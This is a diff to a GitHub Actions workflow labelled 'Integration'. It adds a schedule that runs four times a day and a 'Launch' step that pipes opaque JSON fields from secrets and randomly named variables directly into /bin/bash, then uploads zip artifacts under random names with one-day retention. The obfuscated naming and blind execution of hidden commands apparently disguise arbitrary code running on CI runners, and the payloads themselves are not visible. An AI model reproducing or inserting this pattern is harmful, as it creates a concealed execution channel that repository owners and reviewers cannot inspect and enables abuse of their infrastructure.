@@ -2,6 +2,8 @@ name: Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '59 3,9,15,21 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,17 +18,18 @@ jobs:
           fetch-depth: 1
       - name: Launch
         env:
-          qeza70658: ${{ secrets.qeza70658 }}
+          q3: ${{ secrets.q3 }}
         run: |
-          printf '%s' "$qeza70658" | jq -r .m77968 | /bin/bash
-          echo $s62653 | jq -r .gnmkc453 | /bin/bash
-          echo $xutlp6 | jq -r .zrvpk2853 | /bin/bash
-          printf '%s' "$ky9679" | jq -r .j14924 | /bin/bash
+          printf '%s' "$q3" | jq -r .hp586 | /bin/bash
+          printf '%s' "$ccehu0" | jq -r .vxx57653 | /bin/bash
+          printf '%s' "$hhs538" | jq -r .zjui88649 | /bin/bash
+          printf '%s' "$v26" | jq -r .zrqcr492 | /bin/bash
+          echo $ykpv95 | jq -r .zwl2537 | /bin/bash
 
       - name: Persist output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: 6KWiYQIc
+          name: wWh0XtkU
           path: "*.zip"
           retention-days: 1
